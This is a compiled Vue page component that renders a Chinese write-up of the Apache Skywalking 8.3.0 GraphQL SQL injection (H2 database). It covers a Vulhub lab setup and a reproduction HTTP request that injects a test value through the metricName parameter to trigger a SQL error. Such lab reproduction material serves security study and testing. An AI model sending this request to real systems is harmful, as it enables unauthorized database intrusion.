import{_ as d}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as c,c as l,a as e,b as n,d as a,e as t}from"./app-58e4a7d6.js";const r={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),u=e("p",null,"Apache Skywalking是一款针对分布式系统的应用程序性能监视工具，为微服务，云原生和基于容器（Docker，Kubernetes，Mesos）的体系结构而设计。",-1),v=e("p",null,"在Apache Skywalking 8.3.0版本及以前的GraphQL接口中，存在一处H2 Database SQL注入漏洞。",-1),m=e("p",null,"参考链接：",-1),b={href:"https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw",target:"_blank",rel:"noopener noreferrer"},p={href:"https://github.com/apache/skywalking/commit/0bd81495965d801315dd7417bb17333ae0eccf3b#diff-ec87a1cdf66cdb37574d9eafd4d72d99ed94a38c4a8ff2aa9c7b8daeff502a2c",target:"_blank",rel:"noopener noreferrer"},h=t(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Apache Skywalking 8.3.0版本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>即可查看Skywalking的页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>可见，SQL语句已经出错，<code>metricName</code>参数的值被拼接到<code>from</code>后面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011018294.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这个请求的HTTP数据包为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /graphql HTTP/1.1
Host: your-vps-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 405

{
    &quot;query&quot;:&quot;query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
      serviceName
      isError
      content
    }
  }
}
&quot;,
    &quot;variables&quot;:{
        &quot;condition&quot;:{
            &quot;metricName&quot;:&quot;sqli&quot;,
            &quot;state&quot;:&quot;ALL&quot;,
            &quot;paging&quot;:{
                &quot;pageSize&quot;:10
            }
        }
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,9);function g(_,f){const i=s("ExternalLinkIcon");return c(),l("div",null,[o,u,v,m,e("ul",null,[e("li",null,[e("a",b,[n("https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw"),a(i)])]),e("li",null,[e("a",p,[n("https://github.com/apache/skywalking/commit/0bd81495965d801315dd7417bb17333ae0eccf3b#diff-ec87a1cdf66cdb37574d9eafd4d72d99ed94a38c4a8ff2aa9c7b8daeff502a2c"),a(i)])])]),h])}const x=d(r,[["render",g],["__file","Apache Skywalking 8.3.0 graphql SQL注入漏洞.html.vue"]]);export{x as default};
